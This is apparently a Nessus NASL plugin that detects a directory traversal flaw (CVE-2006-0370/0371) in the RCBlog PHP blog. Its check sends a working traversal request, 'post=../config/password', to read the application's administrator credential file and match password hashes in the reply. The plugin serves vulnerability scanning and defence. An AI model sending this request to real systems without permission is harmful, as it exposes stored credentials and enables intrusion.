#
# Josh Zlatin-Amishav josh at ramat dot cc
# GPLv2
#
# Changes by Tenable: reduced the likehood of false positives

if(description)
{
  script_id(20825);
  script_cve_id("CVE-2006-0370", "CVE-2006-0371");
  script_bugtraq_id(16342);
  if (defined_func("script_xref")) 
  {
    script_xref(name:"OSVDB", value:"22679");
    script_xref(name:"OSVDB", value:"22680");
    script_xref(name:"OSVDB", value:"22681");
  }

  script_version ("$Revision: 1.4 $");

  name["english"] = "RCBlog post Parameter Directory Traversal Vulnerability";
  script_name(english:name["english"]);

  desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is prone to directory 
traversal attacks.

Description :

The remote host is running RCBlog, a blog written in PHP. 

The remote version of this software fails to sanitize user-supplied
input to the 'post' parameter of the 'index.php' script.  An attacker
can use this to access arbitrary files on the remote host provided
PHP's 'magic_quotes' setting is disabled or, regardless of that
setting, files with a '.txt' extension such as those used by the
application to store administrative credentials. 

See also : 

http://www.securityfocus.com/archive/1/422499

Solution : 

Remove the application as its author no longer supports it.

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";

script_description(english:desc["english"]);

summary["english"] = "Checks for directory transversal in RCBlog index.php script";

script_summary(english:summary["english"]);

script_category(ACT_ATTACK);

script_family(english:"CGI abuses");
script_copyright(english:"Copyright (C) 2006 Josh Zlatin-Amishav");

script_dependencies("http_version.nasl");
script_require_ports("Services/www", 80);
script_exclude_keys("Settings/disable_cgi_scanning");
exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);

if (thorough_tests) dirs = make_list("/rcblog", "/blog", cgi_dirs());
else dirs = make_list(cgi_dirs());

file = "../config/password";
foreach dir ( dirs )
{
  req = http_get(
    item:string(
      dir, "/index.php?",
      "post=", file
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it looks like it worked.
  if (
    string(file, " not found.</div>") >!< res &&
    'powered by <a href="http://www.fluffington.com/">RCBlog' >< res &&
    egrep(pattern:'<div class="title">[a-f0-9]{32}\t[a-f0-9]{32}</div>', string:res)
  ) {
    security_note(port);
    exit(0);
  }
}
